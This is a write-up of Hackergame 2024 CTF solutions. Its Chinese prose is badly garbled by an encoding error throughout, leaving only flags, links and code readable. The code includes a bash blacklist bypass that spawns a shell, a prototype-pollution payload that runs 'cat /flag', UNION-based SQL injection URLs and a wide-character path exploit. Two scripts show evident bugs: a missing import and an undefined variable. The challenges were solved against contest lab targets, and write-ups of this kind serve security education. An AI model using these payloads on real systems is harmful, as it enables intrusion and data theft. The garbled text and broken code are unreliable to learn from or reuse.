# littleTT's Hackergame 2024 Writeup

<!--è¿™ç¯‡ Writeup ä¹Ÿä¼šå‘å¸ƒåœ¨[æˆ‘ï¼ˆåˆšå»ºå¥½çš„ï¼‰çš„åšå®¢]()ä¸­ã€‚-->

~~æˆ‘èƒ½åœ¨æ‚£æœ‰ ddl * 3 çš„æƒ…å†µä¸‹å†™å®Œè¿™ç¯‡ WP å—~~

<!--[TOC]-->

## ç­¾åˆ°

> åˆ«è¯´è¿™æ­Œè¿˜æŒºæ´—è„‘

å…ˆéšä¾¿æäº¤ä¸€ä¸‹ï¼Œå‘ç°å¤šäº†ä¸€ä¸ª `pass=false` çš„ queryã€‚æ”¹æˆ `pass=true` å³å¯è·å¾— flagã€‚

**`flag{wE!c0Me-to-HaCKeRg4ME-and-3Njoy-hACkINg-ZOZ4}`**


## å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€

> ç­¾åˆ°++

ä¸€å¼€å§‹æ²¡æ„è¯†åˆ°â€œæ‹›æ–°ä¸»é¡µâ€åº”è¯¥æ˜¯ä¸ªç½‘ç«™ï¼Œåœ¨æœåˆ°çš„ [github repo çš„ README](https://github.com/Nebula-CTFTeam/Recruitment-2024/blob/main/README.md) é‡Œæ‰¾äº†åŠå¤©æœ‰æ²¡æœ‰éšè—ä¿¡æ¯ã€‚  
æœ€åç¿»äº†åŠå¤©æ‰å‘ç°[ï¼ˆçœŸæ­£çš„ï¼Ÿï¼‰æ‹›æ–°ä¸»é¡µ](https://www.nebuu.la/)ã€‚

### Checkin Again

å…ˆ `help` çœ‹ä¸€çœ‹æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„å‘½ä»¤ï¼Œå†æŠŠæ¯ä¸ªå‘½ä»¤éƒ½è¯•ä¸€éã€‚~~ç„¶åå°±è¢« `sudo` åˆ›é£äº†ã€‚~~  
äºæ˜¯å°±åœ¨ `env` é‡Œæ‰¾åˆ°äº† flagã€‚

**`flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}`**

### Checkin Again & Again

æ‰¾äº†åŠå¤©æ²¡æœ‰å‘ç°åˆ«çš„ä¸œè¥¿ï¼Œå°±é¡ºæ‰‹ï¼ˆçœŸçš„æ˜¯é¡ºæ‰‹ï¼ï¼‰è¾“å…¥äº† `ls -la`ï¼Œå‘ç°æ ¹ç›®å½•è¿˜æœ‰ä¸€ä¸ªéšè—çš„ `.flag` æ–‡ä»¶ï¼Œç”¨ `cat .flag` æ˜¾ç¤ºå‡ºæ¥å°±å¥½ã€‚

**`flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}`**


## çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

> å–µå–µå–µå–µå–µå–µå–µå–µå–µå–µï¼ˆç¥çŒ«å’ªé—®ç­”åå‘¨å¹´å¿«ä¹ï¼‰

### å–µï¼Ÿ

1. é¦–å…ˆæ‰¾åˆ° ~~Hackergame~~ [ä¿¡æ¯å®‰å…¨å¤§èµ› 2015 çš„~~æ–°~~æ—§é—»](https://lug.ustc.edu.cn/wiki/sec/contest.html)ï¼Œå¾—åˆ°ç­”æ¡ˆæ˜¯ **3A204**ã€‚

2. ä»ä¸»é¡µä¸Šçš„é“¾æ¥è¿›åˆ°æ¯å¹´ Hackergame çš„ Writeup ç»Ÿè®¡é¢˜æ•°ï¼ˆ2019ï¼š28ã€2020ï¼š31ã€2021ï¼š31ã€2022ï¼š33ã€2023ï¼š29ï¼‰ï¼Œå¾—åˆ° 2019 å¹´æœ€æ¥è¿‘ 25 é¢˜ã€‚ï¼ˆè¯è¯´é¢˜ç›®æ€ä¹ˆè¶Šæ¥è¶Šå¤šäº†ï¼‰  
æ‰¾åˆ°å½“å¹´[ç»“æŸæ€»ç»“çš„æ–°é—»](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)ï¼Œå¾—åˆ°ç­”æ¡ˆæ˜¯ **2682**ã€‚

æŠŠè¿™ä¸¤ä¸ªç­”æ¡ˆæäº¤ä¸Šå»ï¼Œå¾—åˆ° 60 åˆ†å³å¯æ‹¿åˆ°ç¬¬ä¸€ä¸ª flagã€‚

**`flag{Î±_9Ã˜Ã˜d_caT_1S_THE_C47_Ï‰h0_C@Ğ˜_P4$5_thE_QU12}`**

### å–µï¼

3. ä» [Hackergame 2018 repo çš„èŠ±çµ®](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)é‡Œæ‰¾åˆ°ç­”æ¡ˆä¸º **ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»**ã€‚

4. é¦–å…ˆæ ¹æ®æç¤ºæ‰¾åˆ°å¯¹åº”çš„[è®ºæ–‡](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)ï¼Œ~~ç„¶åç”¨é‡å­æ³¢åŠ¨é€Ÿè¯»æ³•å°±èƒ½åœ¨1nså†…æ‰¾åˆ°ç­”æ¡ˆäº†~~ï¼Œæ‰«ä¸€éå…¨æ–‡ä¹‹ååœ¨ç¬¬ â‘¨ é¡µçš„ Section 6 é‡Œé¢æ‰¾åˆ°ç­”æ¡ˆã€‚

> Consequently, we propose six types of email spoofing attacks and measure their impact across 16 email services and 20 clients. All 20 clients are configured as MUAs for all 16 providers via IMAP, resulting in **336** combinations (including 16 web interfaces of target providers). 

5. è¿™ä¸ªåº”è¯¥åœ¨å„ç§æ–°é—»é‡Œéƒ½èƒ½æ‰¾åˆ°ï¼Œä½†æˆ‘å·æ‡’ç›´æ¥[é—®äº† ChatGPT](https://chatgpt.com/share/672efb9b-d3fc-800d-b5d8-03390ba59746)ï¼Œä»–ç›´æ¥æŠŠ[æºç½‘é¡µ](https://lore.kernel.org/linux-kernel/a520d1f5-8273-d67e-97fe-67f73edce9f1%40linux-m68k.org/)å’Œ commit id **6e90b6**75cf942e50 éƒ½ä¸¢ç»™æˆ‘äº†ã€‚  
~~ä½†ä»ä¹‹åçš„å¯¹è¯ä¸­æˆ‘ä»¬èƒ½çœ‹å‡º ChatGPT ä¹Ÿæ²¡æœ‰é‚£ä¹ˆé è°±ã€‚~~

6. ä¸€å¼€å§‹æŠŠæºç ä¸¢ç»™äº†ä¸€ä¸ªåœ¨çº¿çš„ [Llama 3 tokenizer](https://lunary.ai/llama3-tokenizer)ï¼Œå¾—åˆ°ä¸€å…± 1837 ä¸ªtokenã€‚æäº¤ä¸Šå»å‘ç°ä¸å¯¹ï¼Œäºæ˜¯å†™äº†ä¸€ä¸ªè„šæœ¬ä» 1800 å¼€å§‹å¾€ä¸Šè¯•ï¼Œä¸€ä¼šå°±å¾—åˆ°ç­”æ¡ˆä¸º **1833**ã€‚

```python
import re
import time

d = {
    "q1": "3A204",
    "q2": "2682",
    "q3": "ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»",
    "q4": "336",
    "q5": "6e90b6",
    "q6": "1837",
}
for i in range(1800, 2000):
    d["q6"] = str(i)
    response = requests.post("http://202.38.93.141:13030/", data=d, headers={"Cookie": ""})
    score = re.search(r"æœ¬æ¬¡æµ‹éªŒæ€»å¾—åˆ†ä¸º (\d+)ã€‚", response.text).group(1)
    if score != "95":
        print(i, score)
        break
    time.sleep(0.1)
```

å› ä¸ºæœ‰ Cookieï¼Œæ‰€ä»¥è„šæœ¬è·‘å®Œæ­£ç¡®ç­”æ¡ˆååˆ·æ–°ä¸€éç½‘é¡µå°±å¯ä»¥çœ‹åˆ°æ»¡åˆ†çš„ flag äº†ã€‚ï¼ˆå¥½è¯„ï¼ï¼‰

**`flag{7eĞ˜_yEÎ›Ğ¯S_0F_HaÂ©kERg4m3_oM3d37Oà¸š_W!7H_NEkÃ˜_quiz}`**


## æ‰“ä¸å¼€çš„ç›’

> åªçœ‹æ ‡é¢˜è¿˜ä»¥ä¸ºæ˜¯è¦å¼€ç›’

å–œé—»ä¹è§çš„~~å¼€ç›’~~ 3D æ¨¡å‹ç¯èŠ‚ã€‚åœ¨ç½‘ä¸Šéšä¾¿æ‰¾ä¸€ä¸ª [stl viewer](https://imagetostl.com/cn/view-stl-online)ï¼ŒæŠŠæ¨¡å‹ä¸¢è¿›å»æ”¾å¤§å°±èƒ½çœ‹åˆ° flag äº†ã€‚

**`flag{Dr4W_Us!nG_fR3E_C4D!!w0W}`**


## æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼

> ä»Šå¹´ meta å…ƒç´ æ˜¯ä¸æ˜¯æœ‰ç‚¹å¤š

æ‰“å¼€è®ºæ–‡çš„ pdfï¼Œæœç´¢ flagï¼Œå‘ç°é«˜äº®å‡ºç°åœ¨äº†ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹(?)ã€‚æ‰“å¼€ pdf ç¼–è¾‘å™¨ï¼Œå‘ç°ä¸Šé¢ç›–äº†ä¸€ä¸ªç™½è‰²çŸ©å½¢ã€‚åˆ æ‰å°±èƒ½çœ‹åˆ°ä¸‹é¢å†™åœ¨å›¾ç‰‡é‡Œçš„ flag äº†ã€‚  
~~å­¦ä¼šäº†ï¼Œä¸‹æ¬¡æˆ‘ä¹Ÿè¦åœ¨å‘é¡¶ä¼šçš„æ—¶å€™åŸ‹å½©è›‹~~
[~~å…³æ³¨EXCALIBURè°¢è°¢å–µ~~](https://openaccess.thecvf.com/content/CVPR2023/papers/Zhu_EXCALIBUR_Encouraging_and_Evaluating_Embodied_Exploration_CVPR_2023_paper.pdf)

![paper flag](./paper.png)

**`flag{h4PpY_hAck1ng_3veRyd4y}`**

## æ¯”å¤§å°ç‹

> æ—¶~å…‰~å€’~æµ~

éšä¾¿å°è¯•å‡ æ¬¡æŠ“ä¸€ä¸‹åŒ…ï¼Œå‘ç°æ¯å±€æ¸¸æˆéƒ½æ˜¯å…ˆ `POST /game` å¾—åˆ°ä¸€ä¸ªå½¢å¦‚ `{"values": [[x, y] * 100]}` çš„ jsonã€‚åˆ†æ html ä¸­ script çš„é€»è¾‘ï¼Œå‘ç°æ¯è¿›è¡Œä¸€æ¬¡æ¯”è¾ƒéƒ½ä¼šæŠŠæ¯”è¾ƒçš„ç»“æœå­—ç¬¦ï¼ˆ`'<'` æˆ– `'>'`ï¼‰åŠ å…¥ `state.inputs` ä¸­ï¼Œæœ€ååœ¨æ¸¸æˆç»“æŸåæŠŠ `{"inputs": state.inputs}` å‘é€åˆ° `POST /submit`ã€‚  
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„è„šæœ¬æŠŠæ¯æ¬¡æ¯”è¾ƒçš„ç»“æœç›´æ¥ç®—å‡ºæ¥ï¼ŒæŒ‰ç…§ä¸Šè¿°é€»è¾‘ä¸Šä¼ å³å¯å¾—åˆ° flagã€‚  
æ³¨æ„æ¸¸æˆé‡Œä»æ”¶åˆ°æ•°æ®åˆ°å¼€å§‹æœ‰ 3 ç§’é’Ÿçš„å»¶è¿Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç«‹åˆ» post ç­”æ¡ˆã€‚~~å¦åˆ™å°±ä¼šè¢«æ—¶ç©ºè­¦å¯Ÿé€®æ•~~

```python
import requests
import time

host = "http://202.38.93.141:12122"
headers={"Cookie": ""}
response = requests.post(f"{host}/game", headers=headers)

values = response.json()["values"]
inputs = []
for x, y in values:
    if x > y:
        inputs.append(">")
    else:
        inputs.append("<")

time.sleep(5)

response = requests.post(f"{host}/submit", headers=headers, json={"inputs": inputs})
print(response.json()["message"])
```

**`flag{!-@m-tHE-H@CkEr-KiN9-0f-c0MP4r1NG-numB3rS-z0Z4}`**


## æ—…è¡Œç…§ç‰‡ 4.0

> è¿™æ˜¯æˆ‘å€’æ•°ç¬¬ä¸‰é“åšå‡ºæ¥çš„é¢˜...

### LEO_CHAN?

1. æœç´¢â€œç§‘é‡Œç§‘æ°”ç§‘åˆ›é©¿ç«™â€ï¼Œæ‰¾åˆ°äº† USTC çš„[è¿™ç¯‡æ–°é—»](https://iat.ustc.edu.cn/iat/x199/20220901/5860.html)ï¼Œåœ¨åœ°å›¾ä¸Šæœç´¢ä¸€ä¸‹å°±å¯ä»¥å‘ç°é©¿ç«™åœ¨**ä¸œæ ¡åŒºè¥¿é—¨**å¤–ã€‚

2. æœç´¢â€œä¸­ç§‘å¤§ ACG éŸ³ä¹ä¼šâ€ï¼Œæ‰¾åˆ° [LEO é…±çš„ b ç«™è´¦å·](https://space.bilibili.com/7021308)ã€‚ç¿»ä¸€ç¿»åŠ¨æ€å°±å¯ä»¥æ‰¾åˆ°[ä»Šå¹´ ACG éŸ³ä¹ä¼šå¸ƒç½®çš„ç…§ç‰‡](https://www.bilibili.com/opus/930934582351495204)ï¼Œå¾—åˆ°ç­”æ¡ˆ **20240519**ã€‚  
~~ç²¾é€‰è¯„è®ºï¼šâ€œèƒ½åŠä¸€è¾ˆå­acgéŸ³ä¹ä¼šå—ï¼ˆâ€~~

**`flag{5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_819a58a5ad}`**

### FULL_RECALL

3. åœ¨åƒåœ¾æ¡¶ä¸Šçœ‹åˆ°äº†ç–‘ä¼¼â€œå…­å®‰å›­æ—â€çš„å­—æ ·ï¼Œç»“åˆä¸å¤ªå¸¸è§çš„å½©è™¹è‰²è·‘é“ï¼Œæœç´¢åˆ°äº†å…­å®‰å¸‚çš„**ä¸­å¤®æ£®æ—å…¬å›­**ã€‚

4. æŠŠå›¾æ‰”è¿› Google æˆ–è€… Yandex ç›´æ¥è¯†åˆ«ä¸€ä¸‹ï¼Œå°±èƒ½æ‰¾åˆ°ä¸‰å³¡åå€åŸºçŸ³çš„å›¾ï¼Œæœç´¢å¯çŸ¥å…¶ä½äºå®œæ˜Œ**å›å­å²­**é£æ™¯åŒºå†…ã€‚

**`flag{D3T41LS_M4TT3R_1F_R3V3RS3_S34RCH_1S_1MP0SS1BL3_5f3543295d}`**

### OMINOUS_BELL

5. æ‰¾åˆ°çº¿è·¯åå…ˆæœç´¢äº†æ²¿é€”çš„å‡ ä¸ªè½¦ç«™ï¼Œä½†åœ¨åœ°å›¾ä¸Šéƒ½æ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„ç»“æ„ï¼Œé‚ä½œç½¢ã€‚ï¼ˆè¿™é‡Œåæ§½ä¸€ä¸‹ç™¾åº¦åœ°å›¾å¯¹æµ·å¤– IP çœŸçš„ä¸å¤ªå‹å¥½...æ¯æ¬¡æœç´¢éƒ½è¦åšä¸€ééªŒè¯ç ï¼‰ä¸´è¿‘ç»“æŸçš„æ—¶å€™æ‰æƒ³èµ·æ¥è¿™é¢˜è¿˜æ²¡åšï¼Œäºæ˜¯ä»åŒ—äº¬åŒ—ç«™å¼€å§‹æ²¿ç€çº¿è·¯æ‰¾æœ‰æ²¡æœ‰å˜å®½çš„åœ°æ–¹ï¼Œç»ˆäºåœ¨äº¬æ–°é«˜é€Ÿé¾™æ³½é™„è¿‘æ‰¾åˆ°äº†èƒ½å¯¹ä¸Šçš„ç»“æ„ã€‚æœ€è¿‘çš„åŒ»é™¢å°±æ˜¯åŒ—äº¬**ç§¯æ°´æ½­åŒ»é™¢**ï¼ˆæ–°é¾™æ³½é™¢åŒºï¼‰ã€‚  
~~æˆ‘ä¸€ä¸ªåŒ—äº¬äººæ€ä¹ˆéƒ½ä¸çŸ¥é“è¿™é‡Œè¿˜æœ‰ä¸ªç§¯æ°´æ½­åŒ»é™¢~~

6. çœ‹åˆ°å·¦ä¸‹è§’ä¸å¤ªå¸¸è§çš„ç²‰è‰²æ¶‚è£…ï¼Œæœç´¢â€œå››ç¼–ç»„åŠ¨è½¦ ç²‰è‰²â€å¾—åˆ°åŒ—äº¬æ€€æŸ”å¯†äº‘çº¿ï¼Œç»§è€Œå¾—åˆ°åŠ¨è½¦ç»„å‹å·ä¸º **CRH6F-A**ã€‚

**`flag{1_C4NT_C0NT1NU3_TH3_5T0RY_4NYM0R3_50M30N3_PLZ_H3LP_69e42fa1c0}`**


## ä¸å®½çš„å®½å­—ç¬¦

> å”‰ï¼ŒC++ï¼Œå”‰

å› ä¸ºæä¾›äº†æºä»£ç ï¼Œæ‰€ä»¥åŠ ä¸Šä¸€äº› `cout` å°±å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å­—ç¬¦å¯¹åº”çš„ `c_str()` çš„å†…å®¹å•¦ã€‚  
è§‚å¯Ÿå‘ç° ASCII å­—ç¬¦ä¼šåœ¨åé¢è¡¥ä¸€ä¸ªå­—èŠ‚çš„ 0ï¼Œè€Œ Unicode å­—ç¬¦ä¼šæŒ‰ç…§ UTF-16 ç¼–ç å¹¶ä¿å­˜åä¸¤ä¸ªå­—èŠ‚ã€‚  
äºæ˜¯æˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸²æ±‰å­—ä½¿å¾—æ¯ä¸ªå­—å¯ä»¥è¢«è§£ç æˆ `Z:\theflag` ä¸­çš„ä¸¤ä½ï¼Œæœ€åå†è¡¥ä¸€ä¸ª `\0` å°±å¯ä»¥äº†ã€‚

```python
from pwn import *
import os

r = remote("202.38.93.141", 14202)
r.recvline()
r.sendline(os.environ["TOKEN"].encode())
r.recvline()

payload = ""
l = list("Z:\\theflag".encode()) + [0, 0xFF]
for i in range(0, len(l), 2):
    x = [0xFF, 0xFE, l[i], l[i + 1]]
    s = bytes(x).decode("utf-16")
    payload += s

r.sendline(payload.encode("utf-8"))
r.interactive()
```

**`flag{wider_char_isnt_so_great_dfe07d1dac}`**


## PowerfulShell

> Make Power(ful)Shell Great Again!

è¿™é¢˜ä¹Ÿå¡äº†æˆ‘å¾ˆä¹…ï¼Œæ„Ÿè§‰å¾ˆç®€å•ä½†å°±æ˜¯å¯¹ä¸ä¸Šç”µæ³¢ã€‚  
é¦–å…ˆæœç´¢ "bash injection bypassing blacklists"ï¼ŒæŸ¥åˆ°äº†[è¿™ç¯‡æ€»ç»“](https://github.com/welchbj/ctf/blob/master/docs/injections.md#bash)ã€‚é‡Œé¢æåˆ°äº† [bash's internal variables](https://tldp.org/LDP/abs/html/internalvariables.html)ï¼Œäºæ˜¯æŠŠæ‰€æœ‰èƒ½ç”¨çš„ç‰¹æ®Šå­—ç¬¦éƒ½è¯•äº†ä¸€éï¼Œå¾—åˆ°ï¼š

```
$[] = 0
$$ = 7
$_ = input
$- = hB
~ = /players
```

ç„¶å...æˆ‘å°±å¡äº†ã€‚å½“æ—¶æ²¡æœ‰ç†è§£ `eval $input` çš„æ„æ€ï¼Œæ‰€ä»¥å®Œå…¨æ²¡æœ‰å¾€å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å‘å»æƒ³ã€‚  
æœ€ç»ˆæ˜¯åœ¨ä¸€æ¬¡æ‰‹è´±çš„è¿‡ç¨‹ä¸­æŠŠä¸¤ä¸ªéƒ¨åˆ†æ‰“åœ¨ä¸€èµ·äº†ï¼Œå‘ç° `$-$[] = hB0`ï¼Œäºæ˜¯æ‰“å¼€äº†æ–°ä¸–ç•Œçš„å¤§é—¨(x)  
ç«é€Ÿ[å»é—®äº† ChatGPT](https://chatgpt.com/share/672fbd1a-141c-800d-ae5f-b40192319782)ï¼Œå‘ç°å¯ä»¥ç›´æ¥æ‹¼å‡º `sh`ï¼Œé‚£æ¥ä¸‹æ¥ä¸å°±ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Ÿ

```python
from pwn import *
import os


def write_line(line):
    print(f"sending {line}")
    r.recvuntil(b"> ")
    r.sendline(line.encode())
    print(r.recvline().decode())

r = remote("202.38.93.141", 12554)
r.recvline()
r.sendline(os.environ["TOKEN"].encode())

write_line("__=~")                  # /players
write_line("___=$-")                # hB
write_line("${__:7:1}${___:$[]:1}") # sh
r.interactive()                     # enter cat /flag
```

**`flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_f7f66e3101}`**


## Node.js is Web Scale

> ChatGPT Is All You Need for Web

è¯´å®è¯è¿™é“é¢˜æˆ‘ç°åœ¨éƒ½ä¸çŸ¥é“æ€ä¹ˆåšå‡ºæ¥çš„(?)

é¢˜ç›®åªç»™äº†ä¸€ä¸ªæºä»£ç æ–‡ä»¶ï¼Œäºæ˜¯ç›´æ¥[æ‰”ç»™ ChatGPT æ‰¾æ¼æ´](https://chatgpt.com/share/672eeb5e-8724-800d-b16c-db2e8606d860) ã€‚  
ChatGPT ä¸Šæ¥å°±æ˜¯ä¸€ä¸ª Prototype Pollutionï¼Œç„¶åæ‰”ç»™æˆ‘ä¸€ä¸ª payloadã€‚ä¼ ä¸Šå»å°±ç›´æ¥èƒ½çœ‹åˆ° flag äº†ã€‚

```http
POST /set HTTP/1.1
Content-Type: application/json

{
  "key": "__proto__.exploit",
  "value": "cat /flag"
}

GET /execute?cmd=exploit HTTP/1.1
```

**`flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_2e6c80b0f0}`**


## PaoluGPT

> ä¸ä¼šæŠŠæˆ‘é—® GPT flag çš„å¯¹è¯ä¹Ÿå…¬å¼€äº†å§ï¼‰

å…ˆçœ‹æºç å‘ç°è¿™é‡Œæœ‰æ˜æ˜¾çš„ SQL æ³¨å…¥ï¼š

```python
results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```

### åƒé‡ŒæŒ‘ä¸€

è¿™ä¹ˆå¤šæ–‡ç« ä¸€ç¯‡ä¸€ç¯‡ç¿»ä¹Ÿå¤ªéº»çƒ¦äº†ï¼Œäºæ˜¯ç›´æ¥æ‰¾ contents é‡Œé¢å«æœ‰ flag çš„æ–‡ç« ï¼š

```
/view?conversation_id=1' UNION SELECT title, contents FROM messages WHERE contents LIKE '%flag%'--
```

æ‰“å¼€ä¸€çœ‹ï¼Œä½ ç»™æˆ‘å¹²å“ªæ¥äº†ï¼Œè¿™å“ªæœ‰ flag å•Šï¼Ÿåæ¥å‘ç°æ˜¯è¦ç¿»åˆ°æœ€ä¸‹é¢æ‰èƒ½çœ‹åˆ°...

**`flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_8ab76b390d}`**

### çª¥è§†æœªçŸ¥

#### æœªçŸ¥ï¼Ÿ

ä» `/list` çš„å¤„ç†ä¸Šæˆ‘ä»¬èƒ½çœ‹åˆ°è¡¨é‡Œè¿˜æœ‰ `shown` è¿™ä¸ªå­—æ®µï¼Œé‚£æ ¹æ®æ ‡é¢˜æˆ‘ä»¬å°±è¦æ‰¾ `shown = false` çš„é‚£ç¯‡éšè—æ–‡ç« ï¼š

```
/view?conversation_id=1' UNION SELECT title, contents FROM messages WHERE shown = false--
```

ç¿»åˆ°æœ€ä¸‹é¢å°±èƒ½çœ‹åˆ°ç¬¬äºŒä¸ª flagã€‚

**`flag{zU1_xiA0_de_11m_Pa0lule!!!_6c5fd3cf85}`**

#### å·²çŸ¥ï¼

å› ä¸ºéšè—çš„æ–‡ç« ä¹Ÿè‚¯å®šåŒ…æ‹¬ flag è¿™ä¸ªå•è¯ï¼Œæ‰€ä»¥ç”¨ç¬¬ä¸€éƒ¨åˆ†çš„æ€è·¯ä¹Ÿèƒ½æåˆ°è¿™ç¯‡æ–‡ç« ã€‚  
ä¸è¿‡æºç é‡Œåªä¼šæ˜¾ç¤ºè¿”å›çš„ç¬¬ä¸€é¡¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åŠ ä¸€ä¸ª offset å°±èƒ½çœ‹åˆ°ç¬¬äºŒç¯‡æ–‡ç« äº†ï¼š

```
/view?conversation_id=1' UNION SELECT title, contents FROM messages WHERE contents LIKE '%flag%' LIMIT 1 OFFSET 1--
```


## å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼

> å¼·é­ â˜… ç„¡æ•µ â˜… æœ€å¼·

### Easy

å°å­¦ä¸€å¹´çº§çš„åŒå­¦ä»¬éƒ½çŸ¥é“è¦åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯ 4 çš„å€æ•°åªè¦çœ‹åä¸¤ä½å°±è¡Œäº†ï¼Œå› ä¸º $4 \times 25 = 100$ å¯¼è‡´é«˜ä½éƒ½æ˜¯ 4 çš„å€æ•°ã€‚é‚£ä¹ˆå¯¹äº 16 çš„å€æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦çœ‹åå››ä½å°±è¡Œäº†ã€‚  
ä½†è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å°çš„é—®é¢˜ï¼Œå¦‚æœä¸€ä¸ªæ•°ä¸åˆ°å››ä½é•¿ï¼Œé‚£ä¹ˆç»™æˆ‘ä»¬çš„å­—ç¬¦ä¸²ä¸ä¼šåŒ…æ‹¬å‰ç¼€çš„ 0ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠè¿™äº›å°çš„æ•°å•ç‹¬è€ƒè™‘ï¼Œæˆ–åœ¨æœ€åå°±å¯ä»¥äº†ã€‚

```python
s = set()
x = 0
while x < 10000:
    s.add(f"{x:04d}")
    x += 16

l = set()
x = 0
while x < 1000:
    l.add(str(x))
    x += 16

number = "(0|1|2|3|4|5|6|7|8|9)"
r = f"({number}*({'|'.join(s)}))"
ex = f"({r}|{'|'.join(l)})"
```

**`flag{p0werful_r3gular_expressi0n_easy_32bf004863}`**

### Medium

æœç´¢ "regular expression binary multiple of 13"ï¼Œçœ‹åˆ°ä¸€ä¸ª[è®¨è®º 3 çš„å€æ•°çš„å¸–å­](https://stackoverflow.com/questions/7974655/regex-for-binary-multiple-of-3)ã€‚  
æœ¬è´¨ä¸Šæ˜¯æ„å»ºä¸€ä¸ª DFAï¼Œæ¯ä¸€ä¸ªçŠ¶æ€å¯¹åº”å¤„ç†åˆ°å½“å‰å‰ç¼€æ—¶å¯¹åº”çš„æ•°æ¨¡ 3 çš„ä½™æ•°ã€‚è€Œæ¯ä¸ªè½¬ç§»éƒ½ç›¸å½“äºåŸæœ¬çš„æ•°åŠ ä¸Šæ–°çš„ä¸€ä½ï¼Œæ‰€ä»¥å¯¹äºè¿™é“é¢˜æˆ‘ä»¬å¯ä»¥æ„å»ºè¿™æ ·ä¸€ä¸ª DFA:  
çŠ¶æ€ `S = range(13)`ï¼Œè½¬ç§»æ–¹ç¨‹ `T(i, '0') = (i * 2) % 13, T(i, '1') = (i * 2 + 1) % 13`  
åœ¨ github ä¸Šæœä¸€æœ "dfa to regex"ï¼Œæ‰¾åˆ°[ä¸€ä¸ªèƒ½ç”¨çš„](https://github.com/antok33/DFA-to-regular-expression/blob/master/dfa_to_regex.py)ç›´æ¥è°ƒåŒ…å³å¯ï¼š

```python
num_state = 13
starting_state = "0"
approve_state = DFA_to_REGEX.filtering_input("0")
alphabet = DFA_to_REGEX.filtering_input("0,1")
sequence_of_elimination = ",".join(str(i) for i in range(13))
sequence_of_elimination = DFA_to_REGEX.filtering_input(sequence_of_elimination)

trans_table = {}
for i in range(num_state):
    trans_table[str(i)] = {}
    for k in range(len(alphabet)):
        state = str((i * 2 + int(alphabet[k])) % num_state)
        if state in trans_table[str(i)]:
            trans_table[str(i)][state] += "|" + alphabet[k]
        else:
            trans_table[str(i)][state] = alphabet[k]

ins = DFA_to_REGEX(trans_table, starting_state, approve_state, alphabet)
gnfa = DFA_to_REGEX.dfa_to_gnfa(ins)
last_gnfa = DFA_to_REGEX.main(gnfa, sequence_of_elimination)
regular_expression = last_gnfa["s"]["f"]
ex = regular_expression.replace("e", "")
```

**`flag{pow3rful_r3gular_expressi0n_medium_7b04375bfc}`**

### Hard

å’Œç¬¬äºŒéƒ¨åˆ†ç±»ä¼¼ï¼ŒCRC3 ä¸€å…±æœ‰ 8 ç§å¯èƒ½çš„è¾“å‡ºï¼Œäºæ˜¯æˆ‘ä»¬çš„ DFA å°±è¦æœ‰ 8 ç§çŠ¶æ€ã€‚æ³¨æ„ç©ºå­—ç¬¦ä¸²çš„ CRC3 æ˜¯ 7ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„èµ·å§‹çŠ¶æ€åº”è¯¥æ˜¯ 7 è€Œä¸æ˜¯ 0ã€‚  
è€Œè¿™æ¬¡è¾“å…¥çš„å­—ç¬¦é›†æ˜¯ 0 åˆ° 9ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦éå†ä¸€éè¿™ 80 ç§è½¬ç§»å°±å¯ä»¥äº†ã€‚

```python
import libscrc

alphabet = "0123456789"
d = dict()
for c1 in alphabet:
    start = libscrc.gsm3(c1.encode())
    d[start] = dict()
    for c2 in alphabet:
        end = libscrc.gsm3((c1 + c2).encode())
        d[start][c2] = end

num_state = 8
starting_state = "7"
approve_state = DFA_to_REGEX.filtering_input("0")
alphabet = DFA_to_REGEX.filtering_input(",".join(str(i) for i in range(10)))
sequence_of_elimination = ",".join(str(i) for i in range(8))
sequence_of_elimination = DFA_to_REGEX.filtering_input(sequence_of_elimination)

trans_table = {}
for i in range(num_state):
    trans_table[str(i)] = {}
    for k in range(len(alphabet)):
        state = str(t[i][alphabet[k]])
        if state in trans_table[str(i)]:
            trans_table[str(i)][state] += "|" + alphabet[k]
        else:
            trans_table[str(i)][state] = alphabet[k]

ins = DFA_to_REGEX(trans_table, starting_state, approve_state, alphabet)
gnfa = DFA_to_REGEX.dfa_to_gnfa(ins)
last_gnfa = DFA_to_REGEX.main(gnfa, sequence_of_elimination)
regular_expression = last_gnfa["s"]["f"]
ex = regular_expression.replace("e", "")
```

æœ€åè¿™ä¸ªè¡¨è¾¾å¼åªæœ‰ 92777 ä¸ªå­—ç¬¦ï¼Œè¿œè¿œå°äºé¢˜ç›®è¦æ±‚çš„æœ€å¤§é•¿åº¦ 1000000ã€‚

